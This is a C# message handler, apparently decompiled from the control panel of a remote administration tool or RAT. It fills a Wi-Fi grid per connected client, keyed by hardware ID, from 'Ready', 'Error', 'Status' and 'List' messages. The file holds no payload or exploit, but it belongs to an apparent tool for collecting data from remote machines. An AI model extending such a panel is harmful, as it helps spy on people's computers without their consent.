using System;
using System.Collections;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerWifi
{
	public static void Read(Clients client, object[] objects)
	{
		if (objects.Length < 2)
		{
			return;
		}
		switch ((string)objects[1])
		{
		case "Ready":
		{
			FormWifi form5 = null;
			string hwid = null;
			if (!string.IsNullOrEmpty(client.Hwid))
			{
				form5 = (FormWifi)Application.OpenForms["Wifi:" + client.Hwid];
				if (form5 != null)
				{
					hwid = client.Hwid;
				}
			}
			if (form5 == null)
			{
				foreach (Form openForm in Application.OpenForms)
				{
					if (!(openForm is FormWifi wifiForm) || !openForm.Name.StartsWith("Wifi:"))
					{
						continue;
					}
					string formHwid = openForm.Name.Substring(5);
					if (objects.Length >= 3 && objects[2] is string receivedHwid && string.Equals(formHwid, receivedHwid, StringComparison.OrdinalIgnoreCase))
					{
						form5 = wifiForm;
						hwid = formHwid;
						if (!string.IsNullOrEmpty(hwid) && string.IsNullOrEmpty(client.Hwid))
						{
							client.Hwid = hwid;
						}
						break;
					}
				}
			}
			if (form5 != null)
			{
				if (string.IsNullOrEmpty(client.Hwid) && !string.IsNullOrEmpty(hwid))
				{
					client.Hwid = hwid;
				}
				form5.Invoke((MethodInvoker)delegate
				{
					form5.Text = "Wifi [" + hwid + "]";
					form5.client = client;
					form5.materialLabel1.Enabled = true;
					form5.dataGridView2.Enabled = true;
					form5.materialLabel1.Text = "Succues Connect";
				});
				client.Tag = form5;
			}
			break;
		}
		case "Error":
			if (client.Tag != null)
			{
				FormWifi form2 = (FormWifi)client.Tag;
				form2.Invoke((MethodInvoker)delegate
				{
					form2.materialLabel1.Text = "Error: " + ((objects.Length >= 3) ? ((string)objects[2]) : "Unknown error");
				});
			}
			break;
		case "Status":
		{
			if (client.Tag == null)
			{
				break;
			}
			FormWifi form4 = (FormWifi)client.Tag;
			form4.Invoke((MethodInvoker)delegate
			{
				form4.materialLabel1.Text = "Succues status";
				foreach (DataGridViewRow dataGridViewRow in (IEnumerable)form4.dataGridView2.Rows)
				{
					if (dataGridViewRow.Cells[0].Value as string == ((objects.Length >= 3) ? ((string)objects[2]) : ""))
					{
						dataGridViewRow.Cells[1].Value = ((objects.Length >= 4) ? ((string)objects[3]) : "");
						break;
					}
				}
			});
			break;
		}
		case "List":
		{
			if (client.Tag == null)
			{
				break;
			}
			FormWifi form = (FormWifi)client.Tag;
			form.Invoke((MethodInvoker)delegate
			{
				form.dataGridView2.Rows.Clear();
				form.materialLabel1.Text = "Succues list";
				int num = 2;
				while (num < objects.Length)
				{
					DataGridViewRow dataGridViewRow = new DataGridViewRow
					{
						Cells = 
						{
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = ((num < objects.Length) ? ((string)objects[num++]) : "")
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = ((num < objects.Length) ? ((string)objects[num++]) : "")
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = ((num < objects.Length) ? ((string)objects[num++]) : "")
							}
						}
					};
					form.dataGridView2.Rows.Add(dataGridViewRow);
				}
			});
			break;
		}
		}
	}
}
